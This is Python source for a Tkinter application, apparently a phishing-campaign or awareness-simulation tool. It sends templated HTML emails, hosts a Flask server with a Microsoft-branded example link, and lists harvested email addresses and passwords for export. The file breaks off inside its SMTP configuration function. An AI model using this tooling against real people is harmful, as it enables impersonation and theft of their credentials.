import tkinter as tk # Ambiente gráfico
from tkinter import ttk, filedialog, messagebox # Ambiente gráfico
from tkinterweb import HtmlFrame # Ambiente gráfico mas HTML
import re # Regex
import time # Data e hora
import csv # Tratar ficheiros CSV, mais exportar o intuito
import smtplib # Serviço SMTP
from email.mime.text import MIMEText # Envio Emails
from email.mime.multipart import MIMEMultipart # Envio Emails
import threading # Thread para que a interface da janela principal continue responsiva/ativa
from werkzeug.serving import make_server # Para que a interface da janela principal continue responsiva/ativa, ao parar o serviço (neste caso o serviço web)
from flask import Flask, request, render_template, redirect # Servidor Web
import socket # Para a função de obter IP

# Importa Querys do ficheiro de Base de Dados
from BaseDados.Querys import (
    criaBD_Tabelas, 
    criaRegistosDefault, 
    insereDadosCredenciais,
    select_Credenciais, 
    select_TemplatesEmail, 
    select_TemplatesEmailEnvioEmail, 
    update_dadosTemplateEmail, 
    insert_TemplateEmail, 
    delete_TemplateEmail
)

##### Cores e Fontes ###############
global fonte_padrao
global cor_fundo
global cor_label
global cor_labelfundo
global cor_botao
global cor_botao_hover

# Inputs
fonte_padraoMensagensAlerta = ("Segoe UI", 12)  # Fonte a utilizar nas mensagens de alerta
fonte_padrao = ("Segoe UI", 10)  # Fonte a utilizar nos Input
cor_fundo = "#f4f4f4"  # Cor de fundo da janela
cor_label = "#333333"  # Cor do texto nos labels
cor_labelfundo = "#f4f4f4"  # Cor do texto nos labels
cor_botao = "#0078D7"  # Cor dos botões
cor_botao_hover = "#005A9E"  # Cor dos botões ao passar o mouse
# Função para alterar a cor dos botões ao passar o mouse
def on_enter(event):
    event.widget.configure(bg=cor_botao_hover)
def on_leave(event):
    event.widget.configure(bg=cor_botao)

# Menu Principal
fonte_padraoMenu = ("Segoe UI", 10)  # Fonte a utilizar no Menu
cor_fundoMenu = "#333333"  # Cor de fundo da janela
cor_labelMenu = "#333333"  # Cor do texto nos labels
cor_labelfundoMenu = "#FFFFFF"  # Cor do texto nos labels (ex: #F0F0F0)
cor_fundoConteudoMenu = "#FFFFFF"  # Cor de fundo da janela (ex: #F0F0F0)
fonte_padraobotaoMenu = ("Segoe UI", 12)  # Fonte a utilizar botões laterais no Menu
cor_botaoMenu = "#333333"  # Cor dos botões
cor_botaofundoMenu = "#FFFFFF"  # Cor dos botões
cor_botao_hoverMenu = "#005A9E"  # Cor dos botões ao passar o mouse
# Função para alterar a cor dos botões ao passar o mouse
def on_enterMenu(event):
    event.widget.configure(bg=cor_botao_hoverMenu)
def on_leaveMenu(event):
    event.widget.configure(bg=cor_botaoMenu)

####################

# Variável para manter o controle da janela de edição e criação
janela_edicao = None
janela_criacao = None

## Configuração SMTP - Decrlação variáveis Globais ##
global email
global password
global servidor
global porto
global statusSMTP

email = ""
password = ""
servidor = ""
porto = ""
statusSMTP = 0
#####################

# Obtem o IP Local da máquina onde está a executar
def ipLocal():
    ligacao = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Se não conseguir obter o IP, assume o localhost (127.0.0.1)
    try:
        # Liga a um servidor externo fictício apenas para obter o IP correto
        ligacao.connect(("8.8.8.8", 80))
        ip = ligacao.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        ligacao.close()
    # Retorna o IP
    return ip

## Variáveis Servidor Web Globais ##
global statusServidorWeb
global statusServidorWebThread
global appWeb # Nome do Servidor Web
global enderecoWeb # Endereço ou IP a ser utilizado para o Servidor
global portaEnderecoWeb # Porta do Endereço utilizado para o Servidor
statusServidorWeb = None
statusServidorWebThread = None
enderecoWeb = ipLocal()
portaEnderecoWeb = 5000
# link exemplo: http://127.0.0.1:5000/Microsoft.html?client_id=1234
############################################

# Ao executar a aplicação, vai cria BD e tabelas, caso não existam
criaBD_Tabelas()
# Cria Registos Default (pré-configurados), caso não existam registos na BD
criaRegistosDefault()

### Janela Gráfica
# Centra a janela de edição em relação à janela inteira (não apenas à principal-ROOT)
def Centra_janela(janela, largura, altura):
    # Obtém as dimensões da janela
    largura_janela = janela.winfo_screenwidth()
    altura_janela = janela.winfo_screenheight()
    
    # Calcula a posição central
    pos_x = (largura_janela // 2) - (largura // 2)
    pos_y = (altura_janela // 2) - (altura // 2)
    
    # Define a geometria da janela para a Centra
    janela.geometry(f"{largura}x{altura}+{pos_x}+{pos_y}")

### Envio de Emails
# Altera a cor da label do status SMTP
def atualizar_status_smtp(status):
    global statusSMTP
    
    if status == "ativo":
        label_status_smtp.config(bg="green", text="✓ SMTP Ativo")
        statusSMTP = 1 # Define que o estado é 1 de ativo
    else:
        label_status_smtp.config(bg="red", text="✗ SMTP Inativo")
        statusSMTP = 0 # Define que o estado é 0 de inativo
# Envio de e-mail
def enviaEmail(servidor, porto, utilizador, password, destinatario, assunto, conteudo):
    #porto 465 (SSL/TLS): O código utiliza smtplib.SMTP_SSL() diretamente para criar uma ligação segura, pois a porto 465 requer uma ligação SSL/TLS desde o início.
    #porto 587 (STARTTLS): A ligação começa como uma ligação simples e é convertida para uma ligação segura com o comando starttls(). Encripta a comunicação.
    #porto 25 (sem criptografia): A ligação será feita sem encriptação.

    # Tratar cada variável, para garantir que não existem espaços (e caracteres de nova linha, tabulação, etc.) no início e no final de cada string
    destinatario = destinatario.strip()
    assunto = assunto.strip()
    conteudo = conteudo.strip()

    # Criação da mensagem
    mensagem = MIMEMultipart()
    mensagem['From'] = utilizador  # E-mail de origem
    mensagem['Subject'] = assunto
    mensagem.attach(MIMEText(conteudo, 'html')) # Converte para HTML o conteúdo a ser enviado

    estado = 0
    resultado = ""

    try:
        if porto == 465:  # SSL/TLS diretamente (porto 465)
            with smtplib.SMTP_SSL(servidor, porto) as comunicacaoservidor:
                comunicacaoservidor.login(utilizador, password)  
                mensagem['To'] = destinatario 
                comunicacaoservidor.sendmail(mensagem['From'], destinatario, mensagem.as_string())
                estado = 1
                resultado = "E-mail enviado com sucesso!"
        
        elif porto == 587:  # STARTTLS (porto 587)
            with smtplib.SMTP(servidor, porto) as comunicacaoservidor:
                comunicacaoservidor.starttls()  # Criptografia STARTTLS
                comunicacaoservidor.login(utilizador, password)  
                mensagem['To'] = destinatario  
                comunicacaoservidor.sendmail(mensagem['From'], destinatario, mensagem.as_string())
                estado = 1
                resultado = "E-mail enviado com sucesso!"

        elif porto == 25:  # SMTP sem criptografia (porto 25)
            with smtplib.SMTP(servidor, porto) as comunicacaoservidor:
                comunicacaoservidor.login(utilizador, password)  
                mensagem['To'] = destinatario  
                comunicacaoservidor.sendmail(mensagem['From'], destinatario, mensagem.as_string())
                estado = 1
                resultado = "E-mail enviado com sucesso!"
        
        else:
            estado = 0
            resultado = f"Porto {porto} não suportado. Utilize o 25, 465 ou 587."

    except Exception as e:
        estado = 0
        resultado = f"E-mail não enviado: {e}"

    # Retorna o resultado e respetiva mensagem associada
    return estado, resultado

### Opção Menu: Credenciais
# Copiar linhas selecionadas
def copiar_dados():
    # Verifica se há linhas selecionadas
    selecionado = tree.selection()
    if not selecionado:
        messagebox.showwarning("Aviso", "Por favor, selecione pelo menos 1 linha.")
        return

    # Lista para armazenar os dados das linhas selecionadas
    dados_formatados = []

    # Formata cada linha, conforme as linhas selecionadas
    for item in selecionado:
        dados = tree.item(item, 'values')
        # Formata os dados da linha selecionada
        dados_formatados.append("\n".join([f"{col}: {valor}" for col, valor in zip(tree["columns"], dados)]))

    # Une todos os dados formatados com uma linha em branco entre eles
    dados_para_copiar = "\n\n".join(dados_formatados)

    # Copia os dados para a área de transferência
    root.clipboard_clear()  # Limpa o conteúdo anterior da área de transferência do SO
    root.clipboard_append(dados_para_copiar)  # Adiciona os dados formatados para a área de transferência do SO

    # Mostra uma mensagem a informar que os dados foram copiados
    messagebox.showinfo("Sucesso", f"{len(selecionado)} linhas copiadas para a área de transferência.")
# Exportar os resultados para um ficheiro CSV
def exportar_resultados():
    # Abrir a caixa de diálogo para escolher o local e nome do ficheiro
    ficheiro = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("Ficheiro CSV", "*.csv")])
    
    if not ficheiro:
        return  # Se o utilizador cancelar, não faz nada

    # Obtem os dados da tabela
    dados = []
    for item in tree.get_children():
        dados.append(tree.item(item, 'values'))
    
    try:
        # Abre o ficheiro CSV para escrever os resultados
        with open(ficheiro, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            
            # Escreve os cabeçalhos da tabela no ficheiro
            writer.writerow(tree["columns"])

            # Escreve os dados das linhas da tabela
            for linha in dados:
                writer.writerow(linha)

        # Mostra mensagem de sucesso
        messagebox.showinfo("Sucesso", f"Resultados exportados para {ficheiro}")

    except Exception as e:
        # Mostra mensagem de erro
        messagebox.showerror("Erro", f"Erro ao exportar os resultados: {e}")
# Mostrar credenciais
def Credenciais():

    credenciais = select_Credenciais()  # Recebe uma lista com os dados

    # Limpa o conteúdo anterior da janela
    for widget in frame_conteudo.winfo_children():
        widget.destroy()

    if not credenciais:
        mostrar_conteudo("Sem credenciais para mostrar.")
        return

    # Cria a barra de scroll vertical e horizontal
    vsb = ttk.Scrollbar(frame_conteudo, orient="vertical")
    hsb = ttk.Scrollbar(frame_conteudo, orient="horizontal")

    # Cria uma tabela para mostrar as credenciais
    global tree  # Torna a árvore como variável global para ser possível de acesso noutras funções
    tree = ttk.Treeview(frame_conteudo, columns=("emailenvio", "dataenvio", "horaenvio", "linkaberto", "datalinkaberto", "horalinkaberto", "dadospreenchidos", "emailpreenchido", "passwordpreenchido", "datapreenchido", "horapreenchido", "template"), 
                        show="headings", yscrollcommand=vsb.set, xscrollcommand=hsb.set, selectmode="extended")  # Permite seleção múltipla

    tree.heading("emailenvio", text="Email Envio")
    tree.heading("dataenvio", text="Data Envio")
    tree.heading("horaenvio", text="Hora Envio")
    tree.heading("linkaberto", text="Link Aberto")
    tree.heading("datalinkaberto", text="Data Abertura")
    tree.heading("horalinkaberto", text="Hora Abertura")
    tree.heading("dadospreenchidos", text="Credenciais Inseridas")
    tree.heading("emailpreenchido", text="Email Inserido")
    tree.heading("passwordpreenchido", text="Password Inserido")
    tree.heading("datapreenchido", text="Data Preenchimento")
    tree.heading("horapreenchido", text="Hora Preenchimento")
    tree.heading("template", text="Template")

    # Ajuste automático das larguras das colunas
    for col in tree["columns"]:
        tree.column(col, anchor="w", width=100)  # Define uma largura padrão para cada coluna

    # Insere os dados na tabela
    for credencial in credenciais:
        tree.insert("", "end", values=credencial)
    
    # Alinha conteúdo das colunas ao centro
    for coluna in tree["columns"]:
        tree.column(coluna, anchor=tk.CENTER)

    # Coloca a barra de scroll vertical e horizontal
    vsb.config(command=tree.yview)
    hsb.config(command=tree.xview)

    # Coloca a tabela no layout
    tree.grid(row=0, column=0, sticky="nsew")
    vsb.grid(row=0, column=1, sticky="ns")
    hsb.grid(row=1, column=0, sticky="ew")

    # Expande as colunas e linhas para ajustar dinamicamente
    frame_conteudo.grid_rowconfigure(0, weight=1)
    frame_conteudo.grid_columnconfigure(0, weight=1)
    frame_conteudo.grid_columnconfigure(1, weight=0)

    # Frame para os botões na parte inferior
    frame_botoes = tk.Frame(frame_conteudo, bg=cor_fundoConteudoMenu)
    frame_botoes.grid(row=2, column=0, columnspan=2, pady=10)  # Colocado abaixo da tabela

    # Botões para copiar dados e exportar resultados
    botao_copiar = tk.Button(frame_botoes, text="Copiar Dados", font=fonte_padrao, command=copiar_dados, bg=cor_botao, fg="white", relief="flat")
    botao_copiar.pack(side="left", padx=10)  # Posicionado à esquerda
    # Adiciona eventos de hover nos botões
    botao_copiar.bind("<Enter>", on_enter)
    botao_copiar.bind("<Leave>", on_leave)

    botao_exportar = tk.Button(frame_botoes, text="Exportar Resultados", font=fonte_padrao, command=exportar_resultados, bg=cor_botao, fg="white", relief="flat")
    botao_exportar.pack(side="left", padx=10)  # Posicionado à direita
    # Adiciona eventos de hover nos botões
    botao_exportar.bind("<Enter>", on_enter)
    botao_exportar.bind("<Leave>", on_leave)

### Opção Menu: Templates
# Sem Templates Email
def semtemplates_email():
    label_conteudo = tk.Label(frame_conteudo, text="Nenhum template de e-mail encontrado.", font=fonte_padraoMensagensAlerta, justify="left", bg=cor_labelfundoMenu)
    label_conteudo.pack(padx=20, pady=10, anchor="nw")

    botao_Criar = tk.Button(frame_conteudo, text="Criar Registo", font=fonte_padrao, command=criar_templateEmail, bg=cor_botao, fg="white", relief="flat")
    botao_Criar.pack(pady=10, padx=20, anchor="nw")
# Editar dados da linha selecionada
def editar_templateEmail():
    global janela_edicao  # Referencia a variável global

    # Verifica se a janela de edição já está aberta
    if janela_edicao is not None and janela_edicao.winfo_exists():
        return  # Se a janela de edição já estiver aberta, não faz nada

    # Obtém o item selecionado
    item_id = tree.selection()

    if not item_id:
        # Se nenhuma linha for selecionada, retorna e mostra a mensagem
        messagebox.showwarning("Aviso", "Por favor, selecione uma linha para editar.")
        return

    # Obtém os valores da linha selecionada
    valores = tree.item(item_id, 'values')

    # Cria uma janela de edição
    janela_edicao = tk.Toplevel(root)
    janela_edicao.title("Editar")
    janela_edicao.configure(bg=cor_fundo)  # Define o fundo da janela
    janela_edicao.resizable(False, False)  # Bloqueia o maximizar ou redimensionar da janela

    # Tamanho da janela de edição
    largura_janela = 430
    altura_janela = 360

    # Tamanho inicial da janela
    janela_edicao.geometry(f"{largura_janela}x{altura_janela}")

    # Centra a janela de edição
    Centra_janela(janela_edicao, largura_janela, altura_janela)

    # Foco e bloqueio da janela de edição
    janela_edicao.focus_set()  # Foco na janela de edição
    janela_edicao.grab_set()   # Bloqueia interações com outras janelas até que esta seja fechada

    # Permitir apenas números entre 1 e 5 para "Grau Segurança"
    def validar_grau_seg(valor):
        # Permite valores entre 1 e 5, mas também deixa o campo vazio
        if valor == "" or (valor.isdigit() and 1 <= int(valor) <= 5):
            return True
        return False

    # Valida o campo "Grau Segurança" para permitir apenas números entre 1 e 5
    validate_grau_seg = janela_edicao.register(validar_grau_seg)

    # Cria os campos de entrada para editar os dados
    labels = [
        "ID", "Nome", "Assunto", "Conteúdo",
        "Grau Segurança", "Tipo Destinatário", "Inativo"
    ]

    entradas = []
    check_inativo = None
    grau_seg_entrada = None

    for idx, label in enumerate(labels):
        tk.Label(janela_edicao, text=label, font=fonte_padrao, fg=cor_label, bg=cor_labelfundo).grid(
            row=idx + 1, column=0, padx=10, pady=5, sticky="w")

        if label == "ID":
            # Cria campo de entrada para "ID", mas inativa para edição
            entrada_id = tk.Entry(janela_edicao, width=40, font=fonte_padrao)
            entrada_id.insert(0, valores[idx])  # Preenche com o valor atual do ID
            entrada_id.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            entrada_id.config(state="readonly")  # Coloca o campo "ID" apenas como leitura
            entradas.append(entrada_id)
        
        elif label == "Conteúdo":
            # Cria campo de texto para o "Conteúdo" com várias linhas
            conteudo_entrada = tk.Text(janela_edicao, width=40, height=5, font=fonte_padrao)  # Ajusta o tamanho
            conteudo_entrada.insert(tk.END, valores[idx])  # Preenche com o valor atual do conteúdo
            conteudo_entrada.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            entradas.append(conteudo_entrada)
        
        elif label == "Inativo":
            # Cria campo de checkbox para o campo "Inativo"
            check_inativo = tk.IntVar(value=1 if valores[idx] == "Sim" else 0)
            tk.Checkbutton(janela_edicao, variable=check_inativo, bg=cor_fundo, anchor="w").grid(
                row=idx + 1, column=1, padx=10, pady=5, sticky="w")
        
        elif label == "Grau Segurança":
            # Cria campo para "Grau Segurança" com validação para números entre 1 e 5
            grau_seg_entrada = tk.Entry(janela_edicao, width=40, font=fonte_padrao)
            grau_seg_entrada.insert(0, valores[idx])
            grau_seg_entrada.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            # Permite apenas números entre 1 e 5
            grau_seg_entrada.config(validate="key", validatecommand=(validate_grau_seg, "%P"))
            entradas.append(grau_seg_entrada)
        
        else:
            # Cria campos de entrada para as outras labels (informações)
            entrada = tk.Entry(janela_edicao, width=40, font=fonte_padrao)
            entrada.insert(0, valores[idx])
            entrada.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            entradas.append(entrada)

    # Guardar os dados editados
    def guardar_edicao():
        global janela_edicao  # Variável global da janela de edição

        # Obtém os valores dos campos de entrada
        novos_dados = []

        for idx, entrada in enumerate(entradas):
            # Se a entrada for um campo de texto (campo com múltiplas linhas), usa o método apropriado
            if isinstance(entrada, tk.Text):  
                novos_dados.append(entrada.get("1.0", tk.END).strip())  # Obtém o conteúdo do texto
            else:
                # Para os outros tipos de entrada (Entry ou Checkbutton), usamos o método .get()
                novos_dados.append(entrada.get())

        # Verifica se o campo "Grau Segurança" não está vazio
        if grau_seg_entrada.get() == "":
            messagebox.showinfo("Aviso", "Não pode gravar o registo com o campo Grau Segurança a vazio!")
            janela_edicao.deiconify()  # Coloca a janela de edição visível, caso tenha sido minimizada
            grau_seg_entrada.focus()
            return

        # Atualiza o valor do campo "Inativo"
        novos_dados.append("1" if check_inativo.get() == 1 else "0") # Para guardar na Base de dados
        
        # Passa os dados para a função de atualização na base de dados: (id, nome, assunto, conteudo, grausegurança, tipodestinatario, inativo)
        update_dadosTemplateEmail(novos_dados[0], novos_dados[1], novos_dados[2], novos_dados[3], novos_dados[4], novos_dados[5], novos_dados[6])

        # Chama a função da grelha para mostrar todos os registos
        TemplatesEmail()
        
        # Fecha a janela de edição
        janela_edicao.destroy()  # Fecha a janela de edição
        janela_edicao = None  # Limpa o valor da variável da janela global

    # Função para cancelar a edição
    def cancelar_edicao():
        global janela_edicao # Variável global da janela de edição
        janela_edicao.destroy()  # Fecha a janela de edição sem guardar
        janela_edicao = None  # Limpa o valor da variável da janela global

    # Botões de Guardar e Cancelar
    btn_guardar = tk.Button(janela_edicao, text="Gravar", command=guardar_edicao,
                        bg=cor_botao, fg="white", font=fonte_padrao, padx=10, pady=5, relief="flat")
    btn_guardar.grid(row=len(labels) + 1, column=0, padx=10, pady=(10, 20), sticky="w")

    btn_cancelar = tk.Button(janela_edicao, text="Cancelar", command=cancelar_edicao,
                            bg=cor_botao, fg="white", font=fonte_padrao, padx=10, pady=5, relief="flat")
    btn_cancelar.grid(row=len(labels) + 1, column=1, padx=10, pady=(10, 20), sticky="e")

    # Adiciona eventos de hover nos botões
    btn_guardar.bind("<Enter>", on_enter)
    btn_guardar.bind("<Leave>", on_leave)
    btn_cancelar.bind("<Enter>", on_enter)
    btn_cancelar.bind("<Leave>", on_leave)
# Criar novo template email
def criar_templateEmail():
    global janela_criacao  # Variável global da janela de edição

    # Verifica se a janela de criação já está aberta
    if janela_criacao is not None and janela_criacao.winfo_exists():
        return  # Se a janela de criação já estiver aberta, não faz nada

    # Cria uma janela de criação
    janela_criacao = tk.Toplevel(root)
    janela_criacao.title("Criar Novo Template")
    janela_criacao.configure(bg=cor_fundo)  # Define o fundo da janela
    janela_criacao.resizable(False, False)  # Bloqueia o maximizar ou redimensionar da janela

    # Tamanho da janela de criação
    largura_janela = 430
    altura_janela = 330

    # Define o tamanho inicial da janela
    janela_criacao.geometry(f"{largura_janela}x{altura_janela}")

    # Centra a janela de criação
    Centra_janela(janela_criacao, largura_janela, altura_janela)

    # Foco e bloqueio
    janela_criacao.focus_set()  # Foco na janela de criação
    janela_criacao.grab_set()   # Bloqueia interações com outras janelas até que esta seja fechada

    # Permitir apenas números entre 1 e 5 para "Grau Segurança"
    def validar_grau_seg(valor):
        # Permite valores entre 1 e 5, mas também deixa o campo vazio
        if valor == "" or (valor.isdigit() and 1 <= int(valor) <= 5):
            return True
        return False

    # Valida o campo "Grau Segurança" para permitir apenas números entre 1 e 5
    validate_grau_seg = janela_criacao.register(validar_grau_seg)

    # Cria os campos de entrada para criar o novo template
    labels = [
        "Nome", "Assunto", "Conteúdo",
        "Grau Segurança", "Tipo Destinatário", "Inativo"
    ]

    entradas = []
    check_inativo = None
    grau_seg_entrada = None

    for idx, label in enumerate(labels):
        tk.Label(janela_criacao, text=label, font=fonte_padrao, fg=cor_label, bg=cor_labelfundo).grid(
            row=idx + 1, column=0, padx=10, pady=5, sticky="w")

        if label == "Nome":
            # Cria campo de entrada para "Nome"
            nome_entrada = tk.Entry(janela_criacao, width=40, font=fonte_padrao)
            nome_entrada.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            nome_entrada.focus_set()
            entradas.append(nome_entrada)

        elif label == "Conteúdo":
            # Cria campo de texto para o "Conteúdo"
            conteudo_entrada = tk.Text(janela_criacao, width=40, height=5, font=fonte_padrao)  # Ajusta o tamanho
            conteudo_entrada.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            entradas.append(conteudo_entrada)
        
        elif label == "Inativo":
            # Cria campo de checkbox para o campo "Inativo"
            check_inativo = tk.IntVar(value=0)  # Por padrão, assume-se que não está inativo
            tk.Checkbutton(janela_criacao, variable=check_inativo, bg=cor_fundo, anchor="w").grid(
                row=idx + 1, column=1, padx=10, pady=5, sticky="w")
        
        elif label == "Grau Segurança":
            # Cria campo para "Grau Segurança" com validação para números entre 1 e 5
            grau_seg_entrada = tk.Entry(janela_criacao, width=40, font=fonte_padrao)
            grau_seg_entrada.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            # Permitir apenas números entre 1 e 5
            grau_seg_entrada.config(validate="key", validatecommand=(validate_grau_seg, "%P"))
            entradas.append(grau_seg_entrada)
        
        else:
            # Cria campos de entrada para as outras labels (informações)
            entrada = tk.Entry(janela_criacao, width=40, font=fonte_padrao)
            entrada.grid(row=idx + 1, column=1, padx=10, pady=5, sticky="w")
            entradas.append(entrada)

    # Guardar os dados do novo template
    def guardar_criacao():
        global janela_criacao  # Variável global da janela de edição

        # Obtém os valores dos campos de entrada
        novos_dados = []

        for idx, entrada in enumerate(entradas):
            # Se a entrada for um campo de texto (campo com múltiplas linhas), usa o método apropriado
            if isinstance(entrada, tk.Text):  
                novos_dados.append(entrada.get("1.0", tk.END).strip())  # Obtém o conteúdo do texto
            else:
                # Para os outros tipos de entrada (Entry ou Checkbutton), usamos o método .get()
                novos_dados.append(entrada.get())

        # Verifica se o campo "Grau Segurança" não está vazio
        if grau_seg_entrada.get() == "":
            messagebox.showinfo("Aviso", "Não pode gravar o registo com o campo Grau Segurança a vazio!")
            janela_criacao.deiconify()  # Torna a janela de criação visível, caso tenha sido minimizada
            grau_seg_entrada.focus()
            return

        # Atualiza o valor do campo "Inativo"
        novos_dados.append("1" if check_inativo.get() == 1 else "0") # Para guardar na Base de dados
        
        # Passa os dados para a função de criação na base de dados: (nome, assunto, conteudo, grausegurança, tipodestinatario, inativo)
        insert_TemplateEmail(novos_dados[0], novos_dados[1], novos_dados[2], novos_dados[3], novos_dados[4], novos_dados[5])

        # Chama a função da grelha para mostrar todos os registos
        TemplatesEmail()

        # Fecha a janela de criação
        janela_criacao.destroy()  # Fecha a janela de criação
        janela_criacao = None  # Limpa a referência da janela global

    # Cancela a criação
    def cancelar_criacao():
        global janela_criacao
        janela_criacao.destroy()  # Fecha a janela de criação sem guardar
        janela_criacao = None  # Limpa a referência da janela global

    # Botões de Guardar e Cancelar
    btn_guardar = tk.Button(janela_criacao, text="Gravar", command=guardar_criacao,
                        bg=cor_botao, fg="white", font=fonte_padrao, padx=10, pady=5, relief="flat")
    btn_guardar.grid(row=len(labels) + 1, column=0, padx=10, pady=(10, 20), sticky="w")

    btn_cancelar = tk.Button(janela_criacao, text="Cancelar", command=cancelar_criacao,
                            bg=cor_botao, fg="white", font=fonte_padrao, padx=10, pady=5, relief="flat")
    btn_cancelar.grid(row=len(labels) + 1, column=1, padx=10, pady=(10, 20), sticky="e")

    # Adiciona eventos de hover nos botões
    btn_guardar.bind("<Enter>", on_enter)
    btn_guardar.bind("<Leave>", on_leave)
    btn_cancelar.bind("<Enter>", on_enter)
    btn_cancelar.bind("<Leave>", on_leave)
# Função para eliminar template email
def eliminar_templateEmail():
    
    # Obtém o item selecionado
    item_id = tree.selection()

    if not item_id:
        # Se nenhuma linha for selecionada, mostra uma mensagem de aviso
        messagebox.showwarning("Aviso", "Por favor, selecione uma linha para eliminar.")
        return

    # Obtém os valores da linha selecionada
    valores = tree.item(item_id, 'values')

    # Mostra uma caixa de diálogo para confirmação
    resposta = messagebox.askyesno("Confirmação", f"Tem a certeza que deseja eliminar o ID {valores[0]} ?")

    if not resposta:
        # Se o utilizador cancelar, encerra a função
        return

    # Elimina o registo da base de dados
    delete_TemplateEmail(valores[0])  # `valores[0]` é o ID do registo

    # Chama a função da grelha para mostrar todos os registos
    TemplatesEmail()

    # Mostra uma mensagem de sucesso
    messagebox.showinfo("Sucesso", "O registo foi eliminado com sucesso.")
# Função para mostrar os templates de email
def TemplatesEmail():

    global fonte_padrao  # Referencia a variável global
    global cor_fundo  # Referencia a variável global
    global cor_label  # Referencia a variável global
    global cor_botao  # Referencia a variável global
    global cor_botao_hover  # Referencia a variável global

    dados = select_TemplatesEmail()  # Recebe uma lista com os dados dos templates

    # Limpa o conteúdo anterior da janela
    for widget in frame_conteudo.winfo_children():
        widget.destroy()

    if not dados:
        semtemplates_email()
        return

    # Cria a barra de scroll vertical e horizontal
    vsb = ttk.Scrollbar(frame_conteudo, orient="vertical")
    hsb = ttk.Scrollbar(frame_conteudo, orient="horizontal")

    # Cria a árvore (tabela)
    global tree  # Torna a árvore global para ser possível aceder a partir de outras funções
    tree = ttk.Treeview(frame_conteudo, columns=("id", "nome", "assunto", "conteudo", "seguranca", "tipodestinatario", "inativo"), 
                        show="headings", yscrollcommand=vsb.set, xscrollcommand=hsb.set) 
    
    tree.heading("id", text="ID")
    tree.heading("nome", text="Nome")
    tree.heading("assunto", text="Assunto")
    tree.heading("conteudo", text="Conteúdo")
    tree.heading("seguranca", text="Grau Segurança")
    tree.heading("tipodestinatario", text="Tipo Destinatário")
    tree.heading("inativo", text="Inativo")

    # Ajuste automático das larguras das colunas
    for col in tree["columns"]:
        tree.column(col, anchor="w", width=100)

    # Insere os dados na tabela
    for valor in dados:
        tree.insert("", "end", values=valor)

    # Define alinhamento do conteúdo das colunas
    tree.column("seguranca", anchor=tk.CENTER)  # seguranca alinhado ao centro
    tree.column("tipodestinatario", anchor=tk.CENTER)    # tipodestinatario alinhado ao centro
    tree.column("inativo", anchor=tk.CENTER)  # inativo alinhado ao centro
    
    # Coloca a barra de scroll
    vsb.config(command=tree.yview)
    hsb.config(command=tree.xview)

    # Coloca a tabela no layout
    tree.grid(row=0, column=0, sticky="nsew")
    vsb.grid(row=0, column=1, sticky="ns")
    hsb.grid(row=1, column=0, sticky="ew")

    # Expande colunas e linhas para ajuste dinâmico
    frame_conteudo.grid_rowconfigure(0, weight=1)
    frame_conteudo.grid_columnconfigure(0, weight=1)
    frame_conteudo.grid_columnconfigure(1, weight=0)

    # Configura a seleção única
    tree.config(selectmode="browse")  # Permite selecionar apenas 1 item

    # Frame para os botões na parte inferior
    frame_botoes = tk.Frame(frame_conteudo, bg=cor_fundoConteudoMenu)
    frame_botoes.grid(row=2, column=0, columnspan=2, pady=10)  # Colocado abaixo da tabela

    # Botão para criar um novo template
    botao_criar = tk.Button(frame_botoes, text="Novo", font=fonte_padrao, command=criar_templateEmail, bg=cor_botao, fg="white", relief="flat")
    botao_criar.pack(side="left", padx=10)  # Posicionado à esquerda
    # Adiciona eventos de hover nos botões
    botao_criar.bind("<Enter>", on_enter)
    botao_criar.bind("<Leave>", on_leave)

    # Botão para editar a linha selecionada
    botao_editar = tk.Button(frame_botoes, text="Editar", font=fonte_padrao, command=editar_templateEmail, bg=cor_botao, fg="white", relief="flat")
    botao_editar.pack(side="left", padx=10)  # Posicionado ao centro
    # Adiciona eventos de hover nos botões
    botao_editar.bind("<Enter>", on_enter)
    botao_editar.bind("<Leave>", on_leave)

    # Botão para eliminar a linha selecionada
    botao_eliminar = tk.Button(frame_botoes, text="Eliminar", font=fonte_padrao, command=eliminar_templateEmail, bg=cor_botao, fg="white", relief="flat")
    botao_eliminar.pack(side="left", padx=10)  # Posicionado à direita
    # Adiciona eventos de hover nos botões
    botao_eliminar.bind("<Enter>", on_enter)
    botao_eliminar.bind("<Leave>", on_leave)

### Opção Menu: Configurações
# Mostrar opções de configuração
def configuracoes():
    global janela_criacao  # Referencia a variável global
    global email # Declarar variável global
    global password # Declarar variável global
    global servidor # Declarar variável global
    global porto # Declarar variável global

    # Verifica se a janela de criação já está aberta
    if janela_criacao is not None and janela_criacao.winfo_exists():
        return  # Se a janela de criação já estiver aberta, não faz nada

    # Cria uma janela de criação
    janela_criacao = tk.Toplevel(root)
    janela_criacao.title("Configuração SMTP")
    janela_criacao.configure(bg=cor_fundo)  # Define o fundo da janela
    janela_criacao.resizable(False, False)  # Proíbe maximizar ou redimensionar a janela

    # Tamanho da janela de criação
    largura_janela = 395
    altura_janela = 200

    # Define o tamanho inicial da janela
    janela_criacao.geometry(f"{largura_janela}x{altura_janela}")

    # Centra a janela de criação
    Centra_janela(janela_criacao, largura_janela, altura_janela)

    # Foco e bloqueio
    janela_criacao.focus_set()  # Foco na janela de criação
    janela_criacao.grab_set()   # Bloqueia interações com outras janelas até que esta seja fechada

    # Função para mostrar ou ocultar password
    def mostrarocultar_password():
        if entrada_password["show"] == "*":
            entrada_password["show"] = ""  # Mostra
            visibilidade.config(text="Ocultar")  # Altera o texto do botão
        else:
            entrada_password["show"] = "*"  # Oculta
            visibilidade.config(text="Mostrar")  # Altera o texto do botão

    # Cria os campos para criar o novo template
    labels = ["Email", "Password", "Servidor", "Porto"]

    entradas = []

    for idx, label in enumerate(labels):
        
        tk.Label(janela_criacao, text=label, font=fonte_padrao, fg=cor_label, bg=cor_labelfundo).grid(
            row=idx + 1, column=0, padx=10, pady=5, sticky="w")

        if label == "Servidor":
            entrada_servidor = tk.Entry(janela_criacao, width=40, font=fonte_padrao)
